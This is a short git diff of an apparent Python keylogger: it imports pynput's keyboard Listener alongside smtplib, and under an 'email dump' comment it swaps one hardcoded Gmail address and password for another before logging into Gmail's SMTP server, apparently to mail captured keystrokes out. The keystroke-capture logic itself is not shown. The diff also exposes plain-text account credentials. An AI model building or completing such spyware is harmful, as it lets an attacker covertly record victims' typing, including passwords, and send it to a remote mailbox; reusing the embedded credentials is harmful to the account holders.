@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import getpass, smtplib, ssl
 from pynput.keyboard import Key, Listener
 #list of imports 
@@ -16,8 +15,8 @@ print('''
 
 #email dump
 
-emailAddr = "unwillingtaco@gmail.com"
-password = "juhgYg-jemput-bafpo6"
+emailAddr = "darknightwing98@gmail.com"
+password = "IronMan$$$"
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(emailAddr, password)
 
